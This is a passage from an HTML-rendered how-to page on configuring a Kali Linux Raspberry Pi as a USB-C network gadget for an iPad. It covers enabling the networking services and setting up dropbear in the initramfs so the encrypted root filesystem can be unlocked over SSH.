style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;Type&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;oneshot&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;ExecStartPre&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;/usr/local/sbin/usb0up.sh&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;ExecStart&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;/usr/sbin/ifup usb0&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;ExecStop&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;/usr/sbin/ifdown usb0&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;ExecStopPost&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;/usr/local/sbin/usb0down.sh&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;RemainAfterExit&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Finally, let’s activate everything.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Become root.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -s&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Make our usb0.sh script executable.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;chmod&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; +x&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/local/sbin/usb0up.sh&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;chmod&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; +x&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/local/sbin/usb0down.sh&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Enable required services.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;systemctl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; daemon-reload&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;systemctl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; enable&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; dnsmasq.service&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;systemctl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; enable&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; usb0.service&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Drop permissions.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;exit&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Second moment of truth: Shut down the system, remove the power, and connect the Pi to your iPad over USB C. The Pi should power on, and then shortly after you unlock the ROOTFS the iPad should be assigned an &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/IPv4&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/IPv4&quot;&gt;IPv4&lt;/a&gt; address via the ethernet device “Kali Linux”. You should then be able to &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/SSH&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SSH&quot;&gt;SSH&lt;/a&gt; in as kali@10.55.0.1.&lt;/p&gt;\n&lt;h2 id=&quot;rootfs-unlock-over-ssh&quot;&gt;RootFS unlock over SSH&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#rootfs-unlock-over-ssh&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Become root.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -s&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Install dropbear + initramfs hooks.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;apt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; install&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; dropbear-initramfs&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Align dropbear SSH host keys with OpenSSH. Normally this&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# isn&#039;t considered a best practice, but...&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#     (1) We&#039;re only ever connecting to the Pi over usb0, not&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#         an open network (or, god forbid, the internet).&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#     (2) We&#039;re actually going to take steps in a moment to&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#         MAKE SURE that (1) is true.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Since we&#039;re only connecting to the Pi via SSH over a SINGLE&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# cable, using a private IP address, and with SSH host keys&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# that are unique to this device, the danger of having these&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# keys disclosed in the event that someone got ahold of the&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Pi&#039;s microSD card seems minimal (after all, such an attacker&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# could just trojan the initramfs.zst directly).&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# (Note that you should make sure to set an EMPTY password&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# when using ssh-keygen to convert they keys to PEM format, as&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# dropbear doesn&#039;t support password-protected host keys.)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;cd&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /etc/dropbear/initramfs&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;rm&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; dropbear_&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;*&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;_host_key&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;cp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /etc/ssh/ssh_host_&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;*&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;_key&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; .&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;for&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; SSH_KEY&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; $(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ls&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; ssh_host_&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;*&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;_key&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; do&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;\tDROPBEAR_KEY&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;echo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$SSH_KEY&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\t\tsed&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -e&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;s/ssh_host_\\(.*\\)_key/dropbear_\\1_host_key/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\tssh-keygen&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -m&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; PEM&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $SSH_KEY&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\tdropbearconvert&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; openssh&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; dropbear&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $SSH_KEY&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $DROPBEAR_KEY&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\trm&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $SSH_KEY&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;done&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# At this point you&#039;ll need to add your SSH public keys to&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# /etc/dropbear/initramfs/authorized_keys. I&#039;m not writing out&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# this step explicitly though; you could be generating a new&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# keypair here, using keys you copied over when setting up the&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# encrypted microSD card, or just copying&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# ~/.ssh/authorized_keys (and making sure that the permissions&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# are right!). You do you.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# That said!&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# As a fan of per-host keys I&#039;m not in love with this step,&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# since it means that if I reset my iPad then I need an&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# external keyboard to unlock the Pi before I can copy over&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# the new public key. Unfortunately, I don&#039;t see any way to&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# support a password-based login (which I think is &quot;secure&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# enough&quot; in here for the same reason that I think that&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# re-using the SSH host keys is &quot;secure enough&quot; in this&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# particular context) without modifying dropbear&#039;s initramfs&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# setup hook (which I&#039;d rather not do, as any changes will be&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# overwritten if the dropbear-initramfs package is updated).&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Add dropbear configuration options. In particular, for an&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# unlock of ROOTFS on successful login.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sed&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -i&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -e&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;s;^#DROPBEAR_OPTIONS=$;DROPBEAR_OPTIONS=&quot;-jks -c /usr/bin/cryptroot-unlock-ssh&quot;;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /etc/dropbear/initramfs/config&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Drop permissions.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;exit&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Create /usr/local/sbin/cryptroot-unlock-ssh.sh:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;sh&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;sh&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#!/bin/sh&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;ROOTFS_DEV&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;crypt_rootfs&lt;/span&gt;&lt;/span&gt;\n&lt;span 